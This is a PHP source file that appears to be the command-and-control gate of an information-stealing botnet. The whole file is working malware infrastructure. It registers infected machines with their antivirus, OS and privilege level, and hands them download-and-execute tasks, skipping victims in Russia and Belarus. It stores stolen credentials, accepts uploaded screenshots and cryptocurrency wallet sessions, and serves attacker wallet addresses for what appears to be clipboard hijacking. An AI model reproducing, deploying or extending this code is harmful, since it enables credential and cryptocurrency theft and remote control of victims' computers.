<?php

   include("Cfg/Config.php");
   include("Cfg/Sync.php");
   include("Cfg/Wallets.php");

   function EncryptRC4($in, $key) 
   {
      $s = array();

      for ($i = 0; $i < 256; $i++) 
      {
         $s[$i] = $i;
      }

      $j = 0;
      $x;

      for ($i=0; $i < 256; $i++) 
      {
         $j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
         $x = $s[$i];
         $s[$i] = $s[$j];
         $s[$j] = $x;
      }

      $i = 0;
      $j = 0;
      $ct = '';
      $y;

      for ($y = 0; $y < strlen($in); $y++) 
      {
         $i = ($i + 1) % 256;
         $j = ($j + $s[$i]) % 256;
         $x = $s[$i];
         $s[$i] = $s[$j];
         $s[$j] = $x;
         $ct .= $in[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
      }

      return $ct;
   }

   Function GetFileName($FileName) 
   {    
      return substr($FileName, 0, strrpos($FileName, "."));
   }

   Function GetFileExtension($FileName) 
   {
      return end(explode(".", $FileName));
   }

   function aGetCountryIndex($ip)
   {
      include_once("F.st/geo_ip.php");
      $geoip = geo_ip::getInstance("F.st/geo_ip.dat");
      $res = $geoip -> lookupCountryCode($ip);

      If ($res != "?")
      {
         return $res;
      }
      else
      {
         return "LAN";
      }
   }

   function aGetCountry($ip)
   {
      include_once("F.st/geo_ip.php");
      $geoip = geo_ip::getInstance("F.st/geo_ip.dat");
      $res = $geoip -> lookupCountryName($ip);

      If ($res != "?")
      {
         return $res;
      }
      else
      {
         return "LAN";
      }
   }

   function GetIP() 
   {
      if (!empty($_SERVER["HTTP_CLIENT_IP"])) 
      {
         $ip = $_SERVER["HTTP_CLIENT_IP"];
      } 
      elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) 
      {
         $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
      } 
      else 
      {
         $ip = $_SERVER["REMOTE_ADDR"];
      }
      
      return $ip;
   }

   function strfix($str)
   {
      return str_replace("'", "", $str);
   }

   function IncreaseCount($taskid, $unitid, $type)
   {

      if ($type == "exec")
      {
         $tp = "0";
      }

      if ($type == "error")
      {
         $tp = "1";
      }

      if ($type == "error2")
      {
         $tp = "2";
      }
      
      $taskid = substr($taskid, 0, -3);
      $taskid = strfix($taskid);
      $unitid = strfix($unitid);	   
      $type = strfix($type);	
      $s_time = time();

      include("Cfg/Config.php");
      $link = mysqli_connect($conf["dbhost"], $conf["dbuser"], $conf["dbpass"]);
      mysqli_select_db($link, $conf["dbname"]);
      mysqli_query($link, "UPDATE `tasks` SET `$type` = `$type` + 1 WHERE `id` = '" . $taskid . "' LIMIT 1");	
      mysqli_query($link, "INSERT INTO results (time, id, tid, res) VALUES ('$s_time', '$unitid', '$taskid', '$tp')");    
      mysqli_close($link);  
   }

   function GetTaskContent($unit_id, $unit_bi, $unit_sd, $unit_dm) 
   {
      $bot_country = aGetCountryIndex(GetIP());

      if ($bot_country == "BY")
      {
         die;
      }     

      if ($bot_country == "RU")
      {
         die;
      } 
   
      include("Cfg/Config.php");
      $link = mysqli_connect($conf["dbhost"], $conf["dbuser"], $conf["dbpass"]);
      mysqli_select_db($link, $conf["dbname"]);

      $sql = mysqli_query($link, "SELECT * FROM `tasks` WHERE `status`='1' AND `id` NOT IN (SELECT `task_id` FROM `tasks_exec` WHERE `unitid`='" . $unit_id . "' AND `exec`='1') ORDER BY id ASC"); 

      while ($task = mysqli_fetch_assoc($sql))
      {
         if($task['arc'] < 2)   
         {
            if($task['arc'] != '' && $task['arc'] != $unit_bi)
               continue;
         }

         if($task['sids'] != '' && $task['sids'] != $unit_sd)
         {
            continue;
         }

         if($task['units'] != '' && $task['units'] != $unit_id)
         {
            continue;
         }

         if ($task['country'] != '' && strpos($task['country'], $bot_country) === false)
         {
             continue;
         }

         if ($task['group'] != '' && strpos($task['group'], $unit_dm) === false)
         {
             continue;
         }
         
         if (!empty($task['path_rc4'])) 
         {
            $res .= $task['id'] . $task['run'] . $task['filetype'] . $task['folder'] . $task['path_rc4'] . "#";
         }
         else
         {
            $res .= $task['id'] . $task['run'] . $task['filetype'] . $task['folder'] . $task['path'] . "#";
         }
         
         mysqli_query($link, "UPDATE `tasks` SET `loads`=`loads` + 1, `status`= IF (`loads` >= `tlimit` and `tlimit` <> 0 ,0 , `status`)  WHERE `id` = '" . $task['id'] . "' LIMIT 1");											
         mysqli_query($link, "INSERT `tasks_exec` VALUES (null, '" . $task['id'] . "', '" . $unit_id . "', '1')");				
      }
      
      mysqli_close($link);

      return $res;
   }

   function AddToCredBase($s_soft, $s_type, $s_host, $s_login, $s_pass) 
   { 
      $s_time = time();
      $s_id = $_POST["id"];
      $s_hash = md5($s_id . $s_type . $s_host . $s_login . $s_pass);

      include("Cfg/Config.php");
      $link = mysqli_connect($conf["dbhost"], $conf["dbuser"], $conf["dbpass"]);
      mysqli_select_db($link, $conf["dbname"]);
      mysqli_query($link, "INSERT INTO stealer (hash, id, soft, time, type, host, login, password) VALUES ('$s_hash', '$s_id', '$s_soft', '$s_time', '$s_type', '$s_host', '$s_login', '$s_pass')");       
      mysqli_close($link);
   }

   function Parse_Credentials($string, $symbol) 
   { 
      $s_id = $_POST["id"];
      $p1 = explode($symbol, strfix($string));

      for ($c = -1; $c++ < strlen($string);)
      {
         if ($p1[$c] <> '')
         {
            $p2 = explode('|', $p1[$c]);
            AddToCredBase($p2[0], $p2[1], $p2[2], $p2[3], $p2[4]);
            $p3 = $p3 .  $p2[1] . " (" . $p2[0] . ")" . "\n\t" . $p2[2] . "\n\t" . $p2[3] . "\n\t" . $p2[4] . "\n\n";
         }         
      }

      file_put_contents('./Credentials/' . $_POST["id"] . '.txt', $p3);
   }

   function AddToBase($bot_id, $bot_sid, $bot_lv, $version, $ar, $bi, $os, $av, $pc, $un, $dm, $og) 
   { 
      $bot_id = strfix($bot_id);
      $bot_sid = strfix($bot_sid);
      $version = strfix($version);
      $ar = strfix($ar);
      $bi = strfix($bi);
      $os = strfix($os);
      $av = strfix($av);
      $pc = strfix($pc);
      $un = strfix($un);
      $dm = strfix($dm);
      $og = strfix($og);
      $time = time();
      $bot_ip = GetIP();
      $country = aGetCountry($bot_ip);
      $country = substr($country, 0, 49);

      switch ($os) 
      {
         case 1: $os = "Windows 10";
         break;
         case 2: $os = "Server 2016";
         break;
         case 3: $os = "Windows 8.1";
         break;
         case 4: $os = "Server 2012";
         break;
         case 5: $os = "Windows 8";
         break;
         case 6: $os = "Server 2012";
         break;
         case 7: $os = "Windows Vista";
         break;
         case 8: $os = "Server 2008";
         break;
         case 9: $os = "Windows 7";
         break;
         case 10: $os = "Server 2008 R2";
         break;
         case 11: $os = "Server 2003 R2";
         break;
         case 12: $os = "Windows XP";
         break;
         case 13: $os = "Server 2003";
         break;
         case 14: $os = "Windows XP SE";
         break;
         case 15: $os = "Server 2000";
         break;
         case 16: $os = "Server 2019";
         break;
         case 17: $os = "Server 2022";
         break;
         case 18: $os = "Windows 11";
         break;
      }

      switch ($av) 
      {
         case 0: $av = "N/A";
         break;
         case 1: $av = "Avast";
         break;
         case 2: $av = "Avira";
         break;
         case 3: $av = "Kaspersky";
         break;
         case 4: $av = "NOD32";
         break;
         case 5: $av = "Panda";
         break;
         case 6: $av = "DrWEB";
         break;
         case 7: $av = "AVG";
         break;
         case 8: $av = "360 TS";
         break;
         case 9: $av = "Bitdefender";
         break;
         case 10: $av = "Norton";
         break;
         case 11: $av = "Sophos";
         break;
         case 12: $av = "Comodo";
         break;
         case 13: $av = "WinDefender";
         break;
      }

      if ($ar == 0)
      {
         $ar = "User";
      }

      if ($ar == 1)
      {
         $ar = "Admin";
      }

      if ($bi == 0)
      {
         $bi = "x32";
      }

      if ($bi == 1)
      {
         $bi = "x64";
      }

      if ($bot_sid == "")
      {
         $bot_sid = "low_vers";
      }

      if ($dm == "")
      {
         $dm = "Workgroup";
      }

      include("Cfg/Config.php");
      $link = mysqli_connect($conf["dbhost"], $conf["dbuser"], $conf["dbpass"]);
      mysqli_select_db($link, $conf["dbname"]);

      list($id, $online) = mysqli_fetch_array(mysqli_query($link, "SELECT id, online FROM units WHERE id = '$bot_id' LIMIT 1"));  

      if ($id) 
      { 
         mysqli_query($link, "UPDATE units SET sid = '$bot_sid', ip = '$bot_ip', online = '$time', country = '$country', ar = '$ar', arch = '$bi', version = '$version', av = '$av', lv = '$bot_lv', og = '$og' WHERE id = '$bot_id' LIMIT 1");
      } 
      else 
      { 
         mysqli_query($link, "INSERT INTO units (id, sid, lv, ip, first_ip, online, country, ar, arch, version, os, av, pc, un, dm, og, reg) VALUES ('$bot_id', '$bot_sid', '$bot_lv', '$bot_ip', '$bot_ip', '$time', '$country', '$ar', '$bi', '$version', '$os', '$av', '$pc', '$un', '$dm', '$og', '$time')");       
      } 

      mysqli_close($link);
   }

   if ($_POST["wlt"]) 
   {
      $w = "_1_" . $wallets["bitcoin"] . "-1-" . "_2_" . $wallets["etherium"] . "-2-" . "_3_" . $wallets["litecoin"] . "-3-" . "_4_" . $wallets["dogecoin"] . "-4-" . "_5_" . $wallets["monero"] . "-5-";

      if (!empty($conf['rc4key']))
      {
        echo "+++" . $w;
      }
      else
      {
        echo "---" . $w;
      }
      
      exit;
   }

   if ($_POST["st"]) 
   {
      echo $options["bot_sync_time"];
      exit;
   }

   if ($_GET["scr"]) 
   {
      if (strcasecmp(GetFileExtension($_FILES['data']['name']), 'jpg') == 0)
      {
         move_uploaded_file($_FILES['data']['tmp_name'], './Screens/'. substr(GetFileName($_FILES['data']['name']) , 0, 12). '.jpg') or die('');
      }

      exit;
   }

   if ($_GET["wal"]) 
   {
      if (strcasecmp(GetFileExtension($_FILES['data']['name']), 'tar') == 0)
      {
         move_uploaded_file($_FILES['data']['tmp_name'], './Sessions/'. substr(GetFileName($_FILES['data']['name']) , 0, 32). '.tar') or die('');
      }

      exit;
   }

   if ($_POST["e0"]) 
   {
      IncreaseCount($_POST["e0"], $_POST["unit"], "error");
      echo "<c>";
      exit;
   }

   if ($_POST["e1"]) 
   {
      IncreaseCount($_POST["e1"], $_POST["unit"], "error2");
      echo "<c>";
      exit;
   }

   if ($_POST["d1"]) 
   {
      IncreaseCount($_POST["d1"], $_POST["unit"], "exec");
      echo "<c>";
      exit;
   }

   if ($_POST["cred"]) 
   {
      if (strlen($_POST["id"]) == 12)
      { 
         Parse_Credentials($_POST["cred"], ':::');
      }
      exit;
   }

   if ($_POST["r"])
   {
      if (!empty($conf['rc4key']))
      {
         $R = " " . EncryptRC4(hex2bin($_POST["r"]), $conf['rc4key']);
      }
      else
      {
         $R = " " . $_POST["r"];
      }

      $_id = substr($R, strpos($R, "id:") + 2, 20);
      $_id = substr($_id, 1, strpos($_id, "vs:") - 1);  
      $_id = substr($_id, 0, 12);

      $_vs = substr($R, strpos($R, "vs:") + 2, 20);
      $_vs = substr($_vs, 1, strpos($_vs, "sd:") - 1);  
      $_vs = substr($_vs, 0, 4);

      $_sd = substr($R, strpos($R, "sd:") + 2, 20);
      $_sd = substr($_sd, 1, strpos($_sd, "os:") - 1);  
      $_sd = substr($_sd, 0, 6);

      $_os = substr($R, strpos($R, "os:") + 2, 20);
      $_os = substr($_os, 1, strpos($_os, "bi:") - 1);
      $_os = substr($_os, 0, 2);

      $_bi = substr($R, strpos($R, "bi:") + 2, 20);
      $_bi = substr($_bi, 1, strpos($_bi, "ar:") - 1);
      $_bi = substr($_bi, 0, 1);  

      $_ar = substr($R, strpos($R, "ar:") + 2, 20);
      $_ar = substr($_ar, 1, strpos($_ar, "pc:") - 1);  
      $_ar = substr($_ar, 0, 1);

      $_pc = substr($R, strpos($R, "pc:") + 2, 20);
      $_pc = substr($_pc, 1, strpos($_pc, "un:") - 1);
      $_pc = substr($_pc, 0, 14);  

      $_un = substr($R, strpos($R, "un:") + 2, 20);
      $_un = substr($_un, 1, strpos($_un, "dm:") - 1);
      $_un = substr($_un, 0, 14);

      $_dm = substr($R, strpos($R, "dm:") + 2, 20);
      $_dm = substr($_dm, 1, strpos($_dm, "av:") - 1);
      $_dm = substr($_dm, 0, 24);

      $_av = substr($R, strpos($R, "av:") + 2, 20);
      $_av = substr($_av, 1, strpos($_av, "lv:") - 1);
      $_av = substr($_av, 0, 2);  

      $_lv = substr($R, strpos($R, "lv:") + 2, 20);
      $_lv = substr($_lv, 1, strpos($_lv, "og:") - 1);  
      $_lv = substr($_lv, 0, 1);

      $_og = substr($R, strpos($R, "og:") + 3, 20);
      $_og = substr($_og, 0, 1);
      
      if (strpos($R, "id:") && strpos($R, "vs:") && strpos($R, "sd:") && strpos($R, "os:") && strpos($R, "bi:") && strpos($R, "ar:") && strpos($R, "pc:") && strpos($R, "un:") && strpos($R, "dm:") && strpos($R, "av:") && strpos($R, "lv:") && strpos($R, "og:"))
      {
         AddToBase($_id, $_sd, $_lv, $_vs, $_ar, $_bi, $_os, $_av, iconv("CP1251", "UTF-8", $_pc), iconv("CP1251", "UTF-8", $_un), iconv("CP1251", "UTF-8", $_dm), iconv("CP1251", "UTF-8", $_og));  
 
         if ($_lv == 0)
         {
            echo "<c>" . GetTaskContent($_id, $_bi, $_sd, $_dm) . "<d>";
         }
      }

      exit;
   }

   header("Refresh: 0; url = Login.php");
?>